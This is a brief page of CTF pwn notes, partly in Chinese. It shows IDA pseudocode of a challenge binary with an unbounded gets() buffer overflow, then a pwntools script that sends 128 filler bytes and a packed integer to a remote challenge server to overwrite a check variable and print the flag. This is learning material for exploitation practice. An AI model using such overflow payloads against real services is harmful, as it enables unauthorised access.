---
layout: default
title: pwn Notes
---
# IDA 查看伪代码

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[128]; // [esp+0h] [ebp-8Ch] BYREF  // gets覆盖 128 字节之后的空间为 2752022
  int v5; // [esp+80h] [ebp-Ch]
  int *p_argc; // [esp+84h] [ebp-8h]

  p_argc = &argc;
  v5 = 2852022;
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  printf("Give me your name: ");
  gets(s);
  printf("date = %d\n", v5);
  if ( v5 == 2752022 )
  {
    puts("You win");
    system("/bin/cat flag");
  }
  else
  {
    puts("You are not allowed");
  }
  return 0;
}
```
# payload
```python
from pwn import *

def main():
    # sh = process('./challenge')
    sh = remote("49.232.142.230", 17789)
    payload = b'a'*128+p32(2752022)
    # sh.sendline(payload) # 2752022   # 2852022
    sh.sendlineafter(b"Give me your name:", payload)
    #sh.recvlines()#
    # sh.interactine()
    # sh.close()
    print(sh.recvall().decode())
main()
```
